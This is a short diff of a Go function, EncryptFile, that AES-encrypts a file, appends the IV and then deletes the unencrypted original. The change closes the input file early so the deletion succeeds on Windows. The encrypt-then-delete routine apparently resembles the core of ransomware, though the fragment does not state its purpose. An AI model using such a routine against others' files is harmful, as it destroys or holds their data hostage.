@@ -207,8 +207,6 @@ func EncryptFile(filename string, extension string, aeskey []byte) {
 	if err != nil {
 		log.Println(err)
 	}
-	// Close file once function has finished execution
-	defer infile.Close()
 
 	// Create cipher block using an AES key
 	block, err := aes.NewCipher(aeskey)
@@ -252,6 +250,9 @@ func EncryptFile(filename string, extension string, aeskey []byte) {
 	}
 	// Append the initialization vector to end of file
 	outfile.Write(initvector)
+	// Close original file stream so that we may delete it from the system. (You cannot delete open files on Windows.)
+	infile.Close()
+	// Delete original unencrypted file
 	os.Remove(filename)
 }
 
